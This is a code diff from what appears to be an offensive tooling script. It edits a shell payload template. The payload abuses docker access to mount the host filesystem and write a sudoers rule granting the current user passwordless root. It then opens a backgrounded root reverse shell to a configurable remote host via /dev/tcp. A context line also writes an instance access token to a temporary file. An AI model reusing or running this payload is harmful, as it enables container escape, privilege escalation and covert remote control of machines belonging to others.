@@ -233,7 +233,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 payload = f"""
 while ! command -v docker; do "echo waiting for docker..."; sleep 30; done
 echo "current user: $(whoami)"
-docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash -c "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/custom-sudoers"
+docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash -c 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/custom-sudoers'
 echo "new user: $(sudo whoami)"
 echo "starting escalated reverse shell..."
 nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1"' >/dev/null 2>&1 &
